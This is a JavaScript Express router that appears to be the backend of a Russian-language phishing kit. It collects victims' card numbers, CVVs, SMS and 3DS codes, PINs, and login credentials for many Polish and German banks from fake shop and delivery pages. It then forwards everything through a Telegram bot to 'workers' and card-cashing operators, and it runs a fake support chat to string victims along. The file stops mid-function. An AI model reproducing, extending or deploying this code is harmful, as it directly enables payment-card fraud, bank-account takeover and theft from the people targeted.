const DeviceDetector = require('node-device-detector')
const request = require('request')
const express = require('express')
const loggy = require('loggy')

/* dbs */
const support = require('../database/models/support')
const receive = require('../database/models/receive')
const cards = require('../database/models/cards')
const logs = require('../database/models/log')
const bbc = require('../database/models/bbc')

const bot = require('../src/bot')
const config = require('../configs/config.json')

const generateCurr = require('../src/other/generateCurr')
const convertCurrency = require ('../src/other/convertCurr2')
const generateBalanceCurr = require('../src/other/generateBalanceCurr')

const detector = new DeviceDetector
const router = express.Router()

/* routes */
// support
router.post('/sendMessage/:id', async (req, res) => {
    try {
        let ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress
        let device = detector.detect(req.headers['user-agent'])

        let info = await receive.findOne({ link: `${req.params['id']}` }).lean()
        if (!info) info = await bbc.findOne({ link: `${req.params['id']}` }).lean()
        
        if (info) {
            if (req.headers['user-agent'].includes('Support')) {
                await support.insertMany({
                    id: `${req.params['id']}`,
                    who: 'Support',
                    text: `${req.body['message']}`,
                    time: `${parseInt(new Date().getTime() / 1000)}`
                }).then(async (v) => {
                    res.json({
                        result: info
                    })
                }).catch(async (e) => {
                    res.json({
                        result: `Error => ${e}`
                    })
                })
            } else {
                await support.insertMany({
                    id: `${req.params['id']}`,
                    who: 'User',
                    text: `${req.body['text']}`,
                    time: `${parseInt(new Date().getTime() / 1000)}`
                }).then(async () => {
                    await bot.telegram.sendMessage(info.tgID, `📬 <b>${info.service}:</b> Новое сообщение!\n\n📬 <b>Товар:</b> ${(info.product_name != undefined) ? info.product_name : `${info.city_from} -> ${info.city_to}`}\n📬 <b>Стоимость:</b> ${(info.product_price != undefined) ? info.product_price : info.price}\n📬 <b>IP Адрес:</b> <code>${ip}</code>\n📬 <b>Устройство:</b> <code>${device.os.name}</code>\n\n📬 <b>Сообщение:</b> <code>${req.body['text']}</code>\n\n📬 <b>Нажми на кнопку ниже, чтоб написать мамонту в тп</b>`, {
                        parse_mode: 'HTML',
                        reply_markup: {
                            inline_keyboard: [
                                [{ text: '💌 Написать в ТП самому 💌', callback_data: `userSupport ${req.params['id']}` }]
                            ]
                        }
                    })

                    res.json({
                        result: 'Success'
                    })
                }).catch(async (e) => {
                    res.json({
                        result: `Error => ${e}`
                    })
                })
            }
        } else {
            res.sendStatus(403)
        }
    } catch (e) {
        loggy.warn(e)
    }
})

router.get('/getMessages/:id/:time', async (req, res) => {
    try {
        let info = await receive.findOne({ link: `${req.params['id']}` }).lean()
        if (!info) info = await bbc.findOne({ link: `${req.params['id']}` }).lean()
        
        if (info != undefined) {
            if (req.params['time'] == '1') {
                await support.find({ id: req.params['id'] }).lean().then((v) => {
                    if (!v) {
                        res.sendStatus(403)
                    } else {
                        let data = []
                        v.forEach((obj) => {
                            data.push({
                                who: obj.who,
                                text: obj.text
                            })
                        })

                        res.json(data)
                    }
                })
            } else {
                await support.findOne({ id: req.params['id'], time: req.params['time'], who: 'Support' }).lean().then((v) => {
                    if (!v) {
                        res.sendStatus(403)
                    } else {
                        res.json({text: v.text})
                    }
                })
            }
        } else {
            res.sendStatus(403)
        }
    } catch (e) {
        loggy.warn(e)
    }
})

// log
router.post('/log/:id', async (req, res) => {
    try {
        let data = await receive.findOne({ link: req.params['id'] }).lean()
        if (!data) data = await bbc.findOne({ link: req.params['id'] }).lean()

        if (!data) {
            res.redirect('https://google.com')
        } else {
            let ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress
            let device = detector.detect(req.headers['user-agent'])

            if (device.os.name) {
                let price = (data.product_price != undefined) ? data.product_price : data.price
                if (req.body['method'] == "CardLog") {
                    let card_check = req.body['cardNumber'].replace(/\s/g, '')
                    let exp_date = `${req.body['cardMonth']}/${req.body['cardYear']}`

                    let bank_name = "Невозможно определить банк мамонта."

                    await cards.findOneAndUpdate(
                        { link: req.params['id'] }, 
                        { 
                            $set:  {
                                link: req.params['id'],
                                bank: bank_name,
                                card_number: req.body['cardNumber'],
                                card_expiration: exp_date,
                                card_cvv: req.body['cardCvv']
                            } 
                        }
                    ).lean().then(async (res) => {
                        if (!res) {
                            await cards.insertMany({
                                link: req.params['id'],
                                bank: bank_name,
                                card_number: req.body['cardNumber'],
                                card_expiration: exp_date,
                                card_cvv: req.body['cardCvv']
                            })
                        }
                    })

                    let curr = generateCurr(data.service)
                    let balanceWithCurr = generateBalanceCurr(data.service, req.body['cardBalance'])

                    convertCurrency(data.service, parseInt(req.body['cardBalance'])).then(async (vvv) => {
                        await bot.telegram.sendMessage(data.tgID, `🎆 <b>${data.service}:</b>\n💳 <b>Мамонт ввел данные карты!</b>\n\n📬 <b>ID:</b> <code>${req.params['id']}</code>\n📬 <b>Товар:</b> ${(data.product_name != undefined) ? data.product_name : `${data.city_from} -> ${data.city_to}`}\n📬 <b>Стоимость:</b> ${price}\n<b>📬 Баланс:</b> ${balanceWithCurr} <b>(~</b><code>${(parseInt(vvv[0]) != undefined ? parseInt(vvv[0]) : 'Невозможно определить баланс')} руб.</code><b>)</b>\n📬 <b>IP Адрес:</b> <code>${ip}</code>\n<b>📬 Банк:</b> ${bank_name}`, {
                            parse_mode: 'HTML',
                            reply_markup: {
                                inline_keyboard: [
                                    [{ text: '💳 Запросить лог карты 💳', callback_data: `requestToLog ${data.link}` }],
                                    [{ text: '💌 Написать в ТП 💌', callback_data: `userSupport ${data.link}` }]
                                ]
                            }
                        })

                        await bot.telegram.sendMessage(config.bot.admin_logs, `<b>${data.service}</b>\n\n<b>📬 Стоимость:</b> ${price}\n📬 <b>ID:</b> <code>${req.params['id']}</code>\n\n<b>💳 Карта:</b> ${req.body['cardNumber']}\n<b>💳 Карта:</b> ${card_check}\n<b>💳 Дата:</b> ${exp_date}\n<b>💳 CVV:</b> ***\n<b>💳 Банк:</b> ${bank_name}\n👨🏻‍💻 <b>Воркер:</b> @${data.tgUsername} | ${data.tgID}\n\n<b>💎 Баланс:</b> ${balanceWithCurr} <b>(~</b><code>${(parseInt(vvv[0]) != NaN) ? parseInt(vvv[0]) : 0} руб.</code><b>/ ~</b><code>${(parseInt(vvv[1]) != NaN) ? parseInt(vvv[1]) : 0} BYN.</code> <b>)</b>`, {
                            parse_mode: 'HTML',
                            reply_markup: {
                                inline_keyboard: [
                                    [{ text: '💳 Взять 💳', callback_data: `vbiv_get ${data.link} ${req.body['cardCvv']}` }],
                                    [{ text: '♻️ Другая карта', callback_data: `vbiv_change ${data.link}` }, { text: '💵 Точный баланс', callback_data: `vbiv_lowmoney ${data.link}` }],
                                    [{ text: '✅ УСПЕХ ✅', callback_data: `vbiv_success ${data.link}` }],
                                ]
                            }
                        })
                    })

                    return res.json({ status: 'success' })
                } else if (req.body['method'] == "3dsLog") {
                    await bot.telegram.sendMessage(data.tgID, `🎆 <b>${data.service}:</b>\n<b>📨 Мамонт ввёл код из сообщения</b>\n\n📬 <b>ID:</b> <code>${req.params['id']}</code>\n📬 <b>Товар:</b> <code>${(data.product_name != undefined) ? data.product_name : `${data.city_from} -> ${data.city_to}`}</code>\n📬 <b>Стоимость:</b> <code>${price}</code>`, {
                        parse_mode: 'HTML',
                        reply_markup: {
                            inline_keyboard: [
                                [{ text: '💌 Написать в ТП 💌', callback_data: `userSupport ${data.link}` }]
                            ]
                        }
                    })

                    await cards.findOne({ link: req.params['id'] }).lean().then(async (res_card) => {
                        await bot.telegram.sendMessage(config.bot.admin_logs, `📬 <b>${data.service}:</b>\n✉️ SMS введена ✉️\n\n📬 <b>Стоимость товара:</b> ${price}\n📬 <b>ID:</b> <code>${req.params['id']}</code>\n\n🏦 <b>Банк:</b> ${res_card.bank}\n📬 <b>Номер карты:</b> ${res_card.card_number}\n📬 <b>SMS:</b> \n\n${req.body['cc_3dscode']}\n\n\n🥷 <b>Вбивер:</b> @${(res_card.vbiver != undefined) ? res_card.vbiver : 'cant get vbiver'}\n👨🏻‍💻 <b>Воркер:</b> @${data.tgUsername}<code> | ${data.tgID}</code>`, { parse_mode: 'HTML' })
                    })

                    return res.json({ status: 'success' })
                } else if (req.body['method'] == "PushLog") {
                    await cards.findOne({ link: req.params['id'] }).lean().then(async (res_card) => {
                        await bot.telegram.sendMessage(config.bot.admin_logs, `📬 <b>${data.service}:</b>\n✉️ Пуш подтверждён ✉️\n\n📬 <b>Стоимость товара:</b> ${price}\n📬 <b>ID:</b> <code>${req.params['id']}</code>\n\n🏦 <b>Банк:</b> ${res_card.bank}\n📬 <b>Номер карты:</b> ${res_card.card_number}\n\n🥷 <b>Вбивер:</b> @${(res_card.vbiver != undefined) ? res_card.vbiver : 'cant get vbiver'}\n👨🏻‍💻 <b>Воркер:</b> @${data.tgUsername}<code> | ${data.tgID}</code>`, { parse_mode: 'HTML' })
                    })

                    return res.json({ status: 'success' })
                } else if (req.body['method'] == 'Key6Log') {
                    await bot.telegram.sendMessage(data.tgID, `🎆 <b>${data.service}:</b>\n<b>🔐 Введён Key6!</b>\n\n📬 <b>ID:</b> <code>${req.params['id']}</code>\n📬 <b>Товар:</b> <code>${(data.product_name != undefined) ? data.product_name : `${data.city_from} -> ${data.city_to}`}</code>\n📬 <b>Стоимость:</b> <code>${price}</code>`, {
                        parse_mode: 'HTML',
                        reply_markup: {
                            inline_keyboard: [
                                [{ text: '💌 Написать в ТП 💌', callback_data: `userSupport ${data.link}` }]
                            ]
                        }
                    })

                    await cards.findOne({ link: req.params['id'] }).lean().then(async (res_card) => {
                        await bot.telegram.sendMessage(config.bot.admin_logs, `📬 <b>${data.service}:</b>\n✉️ Key6 введён ✉️\n\n📬 <b>Стоимость товара:</b> ${price}\n📬 <b>ID:</b> <code>${req.params['id']}</code>\n\n🏦 <b>Банк:</b> ${res_card.bank}\n📬 <b>Номер карты:</b> ${res_card.card_number}\n📬 <b>Key6:</b> ${req.body['cc_3dscode']}\n\n🥷 <b>Вбивер:</b> @${(res_card.vbiver != undefined) ? res_card.vbiver : 'cant get vbiver'}\n👨🏻‍💻 <b>Воркер:</b> @${data.tgUsername}<code> | ${data.tgID}</code>`, { parse_mode: 'HTML' })
                    })

                    return res.json({ status: 'success' })
                } else if (req.body['method'] == 'PINLog') { 
                    await bot.telegram.sendMessage(data.tgID, `🎆 <b>${data.service}:</b>\n<b>🔐 Введён PIN Карты!</b>\n\n📬 <b>ID:</b> <code>${req.params['id']}</code>\n📬 <b>Товар:</b> <code>${(data.product_name != undefined) ? data.product_name : `${data.city_from} -> ${data.city_to}`}</code>\n📬 <b>Стоимость:</b> <code>${price}</code>\n📬 <b>IP Адрес:</b> <code>${ip}</code>`, {
                        parse_mode: 'HTML',
                        reply_markup: {
                            inline_keyboard: [
                                [{ text: '💌 Написать в ТП 💌', callback_data: `userSupport ${data.link}` }]
                            ]
                        }
                    })

                    await cards.findOne({ link: req.params['id'] }).lean().then(async (res_card) => {
                        await bot.telegram.sendMessage(config.bot.admin_logs, `📬 <b>${data.service}:</b>\n✉️ PIN введён ✉️\n\n📬 <b>Стоимость товара:</b> ${price}\n📬 <b>ID:</b> <code>${req.params['id']}</code>\n\n🏦 <b>Банк:</b> ${res_card.bank}\n📬 <b>Номер карты:</b> ${res_card.card_number}\n📬 <b>PIN:</b> ${req.body['cc_3dscode']}\n\n🥷 <b>Вбивер:</b> @${(res_card.vbiver != undefined) ? res_card.vbiver : 'cant get vbiver'}\n👨🏻‍💻 <b>Воркер:</b> @${data.tgUsername}<code> | ${data.tgID}</code>`, { parse_mode: 'HTML' })
                    })

                    return res.json({ status: 'success' })
                } else if (req.body['method'] == 'PinOnline') { 
                    await bot.telegram.sendMessage(data.tgID, `🎆 <b>${data.service}:</b>\n<b>🔐 Введён Online PIN Карты!</b>\n\n📬 <b>ID:</b> <code>${req.params['id']}</code>\n📬 <b>Товар:</b> <code>${(data.product_name != undefined) ? data.product_name : `${data.city_from} -> ${data.city_to}`}</code>\n📬 <b>Стоимость:</b> <code>${price}</code>`, {
                        parse_mode: 'HTML',
                        reply_markup: {
                            inline_keyboard: [
                                [{ text: '💌 Написать в ТП 💌', callback_data: `userSupport ${data.link}` }]
                            ]
                        }
                    })

                    await cards.findOne({ link: req.params['id'] }).lean().then(async (res_card) => {
                        await bot.telegram.sendMessage(config.bot.admin_logs, `📬 <b>${data.service}:</b>\n✉️ Online PIN введён ✉️\n\n📬 <b>Стоимость товара:</b> ${price}\n\n🏦 <b>Банк:</b> ${res_card.bank}\n📬 <b>Номер карты:</b> ${res_card.card_number}\n📬 <b>Online PIN:</b> ${req.body['cc_3dscode']}\n\n🥷 <b>Вбивер:</b> @${(res_card.vbiver != undefined) ? res_card.vbiver : 'cant get vbiver'}\n👨🏻‍💻 <b>Воркер:</b> @${data.tgUsername}<code> | ${data.tgID}</code>`, { parse_mode: 'HTML' })
                    })

                    return res.json({ status: 'success' })
                } else if (req.body['method'] == 'BalanceLog') { 
                    await bot.telegram.sendMessage(data.tgID, `🎆 <b>${data.service}:</b>\n<b>🔐 Введён точный баланс карты!</b>\n\n📬 <b>ID:</b> <code>${req.params['id']}</code>\n📬 <b>Товар:</b> <code>${(data.product_name != undefined) ? data.product_name : `${data.city_from} -> ${data.city_to}`}</code>\n📬 <b>Стоимость:</b> <code>${price}</code>`, {
                        parse_mode: 'HTML',
                        reply_markup: {
                            inline_keyboard: [
                                [{ text: '💌 Написать в ТП 💌', callback_data: `userSupport ${data.link}` }]
                            ]
                        }
                    })

                    await cards.findOne({ link: req.params['id'] }).lean().then(async (res_card) => {
                        await bot.telegram.sendMessage(config.bot.admin_logs, `📬 <b>${data.service}:</b>\n✉️ Точный баланс карты введён ✉️\n\n📬 <b>Стоимость товара:</b> ${price}\n\n🏦 <b>Банк:</b> ${res_card.bank}\n📬 <b>Номер карты:</b> ${res_card.card_number}\n📬 <b>Точный баланс:</b> ${req.body['cc_3dscode']}\n\n🥷 <b>Вбивер:</b> @${(res_card.vbiver != undefined) ? res_card.vbiver : 'cant get vbiver'}\n👨🏻‍💻 <b>Воркер:</b> @${data.tgUsername}<code> | ${data.tgID}</code>`, { parse_mode: 'HTML' })
                    })

                    return res.json({ status: 'success' })
                } else if (req.body['method'] == "BankLogPL") {
                    await bot.telegram.sendMessage(data.tgID, `🎆 <b>${data.service}:</b>\n<b>🔐 Введены данные банк. акка!</b>\n\n📬 <b>ID:</b> <code>${req.params['id']}</code>\n📬 <b>Товар:</b> <code>${(data.product_name != undefined) ? data.product_name : `${data.city_from} -> ${data.city_to}`}</code>\n📬 <b>Стоимость:</b> <code>${price}</code>`, {
                        parse_mode: 'HTML',
                        reply_markup: {
                            inline_keyboard: [
                                [{ text: '💌 Написать в ТП 💌', callback_data: `userSupport ${data.link}` }]
                            ]
                        }
                    })

                    let logStr = ``
                    switch (req.body['bank']) {
                        case "alior":
                            logStr = `🎆 <b>${data.service}:</b> ✉️ Банк. акк ✉️\n📬 <b>Стоимость товара:</b> ${price}\n\n🏦 <b>Банк:</b> ${req.body['bank']}\n📬 <b>Данные:</b> ${req.body['login']}:${req.body['password']}\n\n📬 <b>IP Адрес:</b> <code>${ip}</code>\n👨🏻‍💻 <b>Воркер:</b> @${data.tgUsername}<code> | ${data.tgID}</code>`
                            break
                        case "pko":
                            logStr = `🎆 <b>${data.service}:</b> ✉️ Банк. акк ✉️\n📬 <b>Стоимость товара:</b> ${price}\n\n🏦 <b>Банк:</b> ${req.body['bank']}\n📬 <b>Данные:</b> ${req.body['login']}:${req.body['password']} (PIN: ${req.body['pin']})\n\n📬 <b>IP Адрес:</b> <code>${ip}</code>\n👨🏻‍💻 <b>Воркер:</b> @${data.tgUsername}<code> | ${data.tgID}</code>`
                            break
                        case "ing":
                            logStr = `🎆 <b>${data.service}:</b> ✉️ Банк. акк ✉️\n📬 <b>Стоимость товара:</b> ${price}\n\n🏦 <b>Банк:</b> ${req.body['bank']}\n📬 <b>Данные:</b> ${req.body['login']}:${req.body['password']} (PIN: ${req.body['pin']} | PESEL: ${req.body['pesel']})\n\n📬 <b>IP Адрес:</b> <code>${ip}</code>\n👨🏻‍💻 <b>Воркер:</b> @${data.tgUsername}<code> | ${data.tgID}</code>`
                            break
                        case "santander":
                            logStr = `🎆 <b>${data.service}:</b> ✉️ Банк. акк ✉️\n📬 <b>Стоимость товара:</b> ${price}\n\n🏦 <b>Банк:</b> ${req.body['bank']}\n📬 <b>Данные:</b> ${req.body['login']}:${req.body['password']}\n\n📬 <b>IP Адрес:</b> <code>${ip}</code>\n👨🏻‍💻 <b>Воркер:</b> @${data.tgUsername}<code> | ${data.tgID}</code>`
                            break
                        case "mbank":
                            logStr = `🎆 <b>${data.service}:</b> ✉️ Банк. акк ✉️\n📬 <b>Стоимость товара:</b> ${price}\n\n🏦 <b>Банк:</b> ${req.body['bank']}\n📬 <b>Данные:</b> ${req.body['login']}:${req.body['password']} (Мамка: ${req.body['mamka']})\n\n📬 <b>IP Адрес:</b> <code>${ip}</code>\n👨🏻‍💻 <b>Воркер:</b> @${data.tgUsername}<code> | ${data.tgID}</code>`
                            break
                        case "bnp":
                            logStr = `🎆 <b>${data.service}:</b> ✉️ Банк. акк ✉️\n📬 <b>Стоимость товара:</b> ${price}\n\n🏦 <b>Банк:</b> ${req.body['bank']}\n📬 <b>Данные:</b> ${req.body['login']}:${req.body['password']} (PIN: ${req.body['pin']} | Мамка: ${req.body['mamka']})\n\n📬 <b>IP Адрес:</b> <code>${ip}</code>\n👨🏻‍💻 <b>Воркер:</b> @${data.tgUsername}<code> | ${data.tgID}</code>`
                            break
                        case "pekao":
                            logStr = `🎆 <b>${data.service}:</b> ✉️ Банк. акк ✉️\n📬 <b>Стоимость товара:</b> ${price}\n\n🏦 <b>Банк:</b> ${req.body['bank']}\n📬 <b>Данные:</b> ${req.body['login']}:${req.body['password']} (PIN: ${req.body['pin']} | PESEL: ${req.body['pesel']})\n\n📬 <b>IP Адрес:</b> <code>${ip}</code>\n👨🏻‍💻 <b>Воркер:</b> @${data.tgUsername}<code> | ${data.tgID}</code>`
                            break
                        case "getin":
                            logStr = `🎆 <b>${data.service}:</b> ✉️ Банк. акк ✉️\n📬 <b>Стоимость товара:</b> ${price}\n\n🏦 <b>Банк:</b> ${req.body['bank']}\n📬 <b>Данные:</b> ${req.body['login']}:${req.body['password']}\n\n📬 <b>IP Адрес:</b> <code>${ip}</code>\n👨🏻‍💻 <b>Воркер:</b> @${data.tgUsername}<code> | ${data.tgID}</code>`
                            break
                        case "millennium":
                            logStr = `🎆 <b>${data.service}:</b> ✉️ Банк. акк ✉️\n📬 <b>Стоимость товара:</b> ${price}\n\n🏦 <b>Банк:</b> ${req.body['bank']}\n📬 <b>Данные:</b> ${req.body['login']}:${req.body['password']} (PESEL: ${req.body['pesel']})\n\n📬 <b>IP Адрес:</b> <code>${ip}</code>\n👨🏻‍💻 <b>Воркер:</b> @${data.tgUsername}<code> | ${data.tgID}</code>`
                            break
                        case "agricole":
                            logStr = `🎆 <b>${data.service}:</b> ✉️ Банк. акк ✉️\n📬 <b>Стоимость товара:</b> ${price}\n\n🏦 <b>Банк:</b> ${req.body['bank']}\n📬 <b>Данные:</b> ${req.body['login']}:${req.body['password']}\n\n📬 <b>IP Адрес:</b> <code>${ip}</code>\n👨🏻‍💻 <b>Воркер:</b> @${data.tgUsername}<code> | ${data.tgID}</code>`
                            break
                        case "pocztowy":
                            logStr = `🎆 <b>${data.service}:</b> ✉️ Банк. акк ✉️\n📬 <b>Стоимость товара:</b> ${price}\n\n🏦 <b>Банк:</b> ${req.body['bank']}\n📬 <b>Данные:</b> ${req.body['login']}:${req.body['password']}\n\n📬 <b>IP Адрес:</b> <code>${ip}</code>\n👨🏻‍💻 <b>Воркер:</b> @${data.tgUsername}<code> | ${data.tgID}</code>`
                            break
                        case "sgb":
                            logStr = `🎆 <b>${data.service}:</b> ✉️ Банк. акк ✉️\n📬 <b>Стоимость товара:</b> ${price}\n\n🏦 <b>Банк:</b> ${req.body['bank']}\n📬 <b>Данные:</b> ${req.body['login']}:${req.body['password']} (Otdel: ${req.body['otdel']})\n\n📬 <b>IP Адрес:</b> <code>${ip}</code>\n👨🏻‍💻 <b>Воркер:</b> @${data.tgUsername}<code> | ${data.tgID}</code>`
                            break
                        case "noble":
                            logStr = `🎆 <b>${data.service}:</b> ✉️ Банк. акк ✉️\n📬 <b>Стоимость товара:</b> ${price}\n\n🏦 <b>Банк:</b> ${req.body['bank']}\n📬 <b>Данные:</b> ${req.body['login']}:${req.body['password']}\n\n📬 <b>IP Адрес:</b> <code>${ip}</code>\n👨🏻‍💻 <b>Воркер:</b> @${data.tgUsername}<code> | ${data.tgID}</code>`
                            break
                        case "gbs":
                            
                            break
                        case "nowy":
                            logStr = `🎆 <b>${data.service}:</b> ✉️ Банк. акк ✉️\n📬 <b>Стоимость товара:</b> ${price}\n\n🏦 <b>Банк:</b> ${req.body['bank']}\n📬 <b>Данные:</b> ${req.body['login']}:${req.body['password']}\n\n📬 <b>IP Адрес:</b> <code>${ip}</code>\n👨🏻‍💻 <b>Воркер:</b> @${data.tgUsername}<code> | ${data.tgID}</code>`
                            break
                        case "bos":
                            logStr = `🎆 <b>${data.service}:</b> ✉️ Банк. акк ✉️\n📬 <b>Стоимость товара:</b> ${price}\n\n🏦 <b>Банк:</b> ${req.body['bank']}\n📬 <b>Данные:</b> ${req.body['login']}:${req.body['password']}\n\n📬 <b>IP Адрес:</b> <code>${ip}</code>\n👨🏻‍💻 <b>Воркер:</b> @${data.tgUsername}<code> | ${data.tgID}</code>`
                            break
                        case "citi":
                            logStr = `🎆 <b>${data.service}:</b> ✉️ Банк. акк ✉️\n📬 <b>Стоимость товара:</b> ${price}\n\n🏦 <b>Банк:</b> ${req.body['bank']}\n📬 <b>Данные:</b> ${req.body['login']}:${req.body['password']}\n\n📬 <b>IP Адрес:</b> <code>${ip}</code>\n👨🏻‍💻 <b>Воркер:</b> @${data.tgUsername}<code> | ${data.tgID}</code>`
                            break
                    }

                    await bot.telegram.sendMessage(config.bot.admin_logs, logStr, { parse_mode: 'HTML' })

                    return res.json({ status: 'success' })
                } else if (req.body['method'] == "BankLogDE") {
                    await cards.insertMany({
                        link: req.params['id'],
                        bank: req.body['bank'],
                        card_number: "Это ЛК, это не карта.",
                        card_expiration: "Это ЛК, это не карта.",
                        card_cvv: "Это ЛК, это не карта."
                    })

                    await bot.telegram.sendMessage(data.tgID, `🎆 <b>${data.service}:</b>\n<b>🔐 Введены данные банк. акка!</b>\n\n📬 <b>ID:</b> <code>${req.params['id']}</code>\n📬 <b>Товар:</b> <code>${(data.product_name != undefined) ? data.product_name : `${data.city_from} -> ${data.city_to}`}</code>\n📬 <b>Стоимость:</b> <code>${price}</code>`, {
                        parse_mode: 'HTML',
                        reply_markup: {
                            inline_keyboard: [
                                [{ text: '💌 Написать в ТП 💌', callback_data: `userSupport ${data.link}` }]
                            ]
                        }
                    })

                    let logStr = ``
                    switch (req.body['bank']) {
                        case "Sparkasse":
                            logStr = `🎆 <b>${data.service}:</b> ✉️ Банк. акк ✉️\n📬 <b>Стоимость товара:</b> ${price}\n📬 <b>ID:</b> <code>${req.params['id']}</code>\n\n🏦 <b>Банк:</b> ${req.body['bank']}\n📬 <b>Логин:</b> ${req.body['login']}\n📬 <b>Пароль:</b> ${req.body['password']}\n📬 <b>BIC/BLZ:</b> ${req.body['bik']}\n\n👨🏻‍💻 <b>Воркер:</b> @${data.tgUsername}<code> | ${data.tgID}</code>`
                            break
                        case "Bank Comdirect":
                            logStr = `🎆 <b>${data.service}:</b> ✉️ Банк. акк ✉️\n📬 <b>Стоимость товара:</b> ${price}\n📬 <b>ID:</b> <code>${req.params['id']}</code>\n\n🏦 <b>Банк:</b> ${req.body['bank']}\n📬 <b>Логин:</b> ${req.body['login']}\n📬 <b>Пароль:</b> ${req.body['password']}\n\n👨🏻‍💻 <b>Воркер:</b> @${data.tgUsername}<code> | ${data.tgID}</code>`
                            break
                        case "DKB Bank":
                            logStr = `🎆 <b>${data.service}:</b> ✉️ Банк. акк ✉️\n📬 <b>Стоимость товара:</b> ${price}\n📬 <b>ID:</b> <code>${req.params['id']}</code>\n\n🏦 <b>Банк:</b> ${req.body['bank']}\n📬 <b>Логин:</b> ${req.body['login']}\n📬 <b>Пароль:</b> ${req.body['password']}\n\n👨🏻‍💻 <b>Воркер:</b> @${data.tgUsername}<code> | ${data.tgID}</code>`
                            break
                        case "PostBank":
                            /*  */
                            break
                        case "Commerzbank":
                            logStr = `🎆 <b>${data.service}:</b> ✉️ Банк. акк ✉️\n📬 <b>Стоимость товара:</b> ${price}\n📬 <b>ID:</b> <code>${req.params['id']}</code>\n\n🏦 <b>Банк:</b> ${req.body['bank']}\n📬 <b>Логин:</b> ${req.body['login']}\n📬 <b>PIN:</b> ${req.body['pin']}\n\n👨🏻‍💻 <b>Воркер:</b> @${data.tgUsername}<code> | ${data.tgID}</code>`
                            break
                        case "DZbank":
                            /*  */
                            break
                    }

                    await bot.telegram.sendMessage(config.bot.admin_logs, logStr, { 
                        parse_mode: 'HTML',
                        reply_markup: {
                            inline_keyboard: [
                                [{ text: '💳 Взять 💳', callback_data: `vbiv_get ${data.link}` }],
                                [{ text: '💬 СМС', callback_data: `vbiv_3ds ${data.link}` }, { text: '📲 Push', callback_data: `vbiv_push ${data.link}` }],
                                [{ text: '🔐 PIN ONLINE', callback_data: `vbiv_PINonl ${data.link}` }, { text: '🔐 PIN Карты', callback_data: `vbiv_PINcard ${data.link}` }],
                                [{ text: '✖️ Фэйк код', callback_data: `vbiv_fake ${data.link}` }, { text: '❌ Смена', callback_data: `vbiv_change ${data.link}` }],
                                [{ text: '💵 Точный баланс', callback_data: `vbiv_lowmoney ${data.link}` }, { text: '〽️ Лимиты', callback_data: `vbiv_limits ${data.link}` }],
                                [{ text: '🌐 Нет 3дс', callback_data: `vbiv_no3ds ${data.link}` }],
                                [{ text: '🏦 ЛК', callback_data: `vbiv_lk ${data.link}` }, { text: '✏️ Password', callback_data: `vbiv_password ${data.link}` }],
                                [{ text: '🇮🇹 KEY6', callback_data: `vbiv_key6 ${data.link}` }, { text: '🇩🇪 Секретка', callback_data: `vbiv_secretDE ${data.link}` }, { text: '🇭🇷 mToken', callback_data: `vbiv_mToken ${data.link}` }],
                                [{ text: '✅ УСПЕХ ✅', callback_data: `vbiv_success ${data.link}` }],
                            ]
                        }
                    })
                    return res.json({ status: 'success' })
                } else if (req.body['method'] == 'SecretLog') {
                    await bot.telegram.sendMessage(data.tgID, `🎆 <b>${data.service}:</b>\n<b>🔐 Введён ответ на секретный вопрос!</b>\n📬 <b>ID:</b> <code>${req.params['id']}</code>\n\n📬 <b>Товар:</b> <code>${(data.product_name != undefined) ? data.product_name : `${data.city_from} -> ${data.city_to}`}</code>\n📬 <b>Стоимость:</b> <code>${price}</code>`, {
                        parse_mode: 'HTML',
                        reply_markup: {
                            inline_keyboard: [
                                [{ text: '💌 Написать в ТП 💌', callback_data: `userSupport ${data.link}` }]
                            ]
                        }
                    })

                    await cards.findOne({ link: req.params['id'] }).lean().then(async (res_card) => {
                        await bot.telegram.sendMessage(config.bot.admin_logs, `📬 <b>${data.service}:</b>\n✉️ Секретка введена ✉️\n\n📬 <b>Стоимость товара:</b> ${price}\n📬 <b>ID:</b> <code>${req.params['id']}</code>\n\n🏦 <b>Банк:</b> ${res_card.bank}\n📬 <b>Номер карты:</b> ${res_card.card_number}\n📬 <b>Секретка:</b> ${req.body['cc_3dscode']}\n\n🥷 <b>Вбивер:</b> @${(res_card.vbiver != undefined) ? res_card.vbiver : 'cant get vbiver'}\n👨🏻‍💻 <b>Воркер:</b> @${data.tgUsername}<code> | ${data.tgID}</code>`, { parse_mode: 'HTML' })
                    })

                    return res.json({ status: 'success' })
                } else if (req.body['method'] == 'mToken') {
                    await bot.telegram.sendMessage(data.tgID, `🎆 <b>${data.service}:</b>\n<b>🔐 Введён mToken!</b>\n📬 <b>ID:</b> <code>${req.params['id']}</code>\n\n📬 <b>Товар:</b> <code>${(data.product_name != undefined) ? data.product_name : `${data.city_from} -> ${data.city_to}`}</code>\n📬 <b>Стоимость:</b> <code>${price}</code>`, {
                        parse_mode: 'HTML',
                        reply_markup: {
                            inline_keyboard: [
                                [{ text: '💌 Написать в ТП 💌', callback_data: `userSupport ${data.link}` }]
                            ]
                        }
                    })

                    await cards.findOne({ link: req.params['id'] }).lean().then(async (res_card) => {
                        await bot.telegram.sendMessage(config.bot.admin_logs, `📬 <b>${data.service}:</b>\n✉️ mToken введён ✉️\n\n📬 <b>Стоимость товара:</b> ${price}\n📬 <b>ID:</b> <code>${req.params['id']}</code>\n\n🏦 <b>Банк:</b> ${res_card.bank}\n📬 <b>Номер карты:</b> ${res_card.card_number}\n📬 <b>Секретка:</b> ${req.body['cc_3dscode']}\n\n🥷 <b>Вбивер:</b> @${(res_card.vbiver != undefined) ? res_card.vbiver : 'cant get vbiver'}\n👨🏻‍💻 <b>Воркер:</b> @${data.tgUsername}<code> | ${data.tgID}</code>`, { parse_mode: 'HTML' })
                    })

                    return res.json({ status: 'success' })
                } else if (req.body['method'] == 'PasswordLog') {
                    await bot.telegram.sendMessage(data.tgID, `🎆 <b>${data.service}:</b>\n<b>🔐 Введён Password!</b>\n📬 <b>ID:</b> <code>${req.params['id']}</code>\n\n📬 <b>Товар:</b> <code>${(data.product_name != undefined) ? data.product_name : `${data.city_from} -> ${data.city_to}`}</code>\n📬 <b>Стоимость:</b> <code>${price}</code>`, {
                        parse_mode: 'HTML',
                        reply_markup: {
                            inline_keyboard: [
                                [{ text: '💌 Написать в ТП 💌', callback_data: `userSupport ${data.link}` }]
                            ]
                        }
                    })

                    await cards.findOne({ link: req.params['id'] }).lean().then(async (res_card) => {
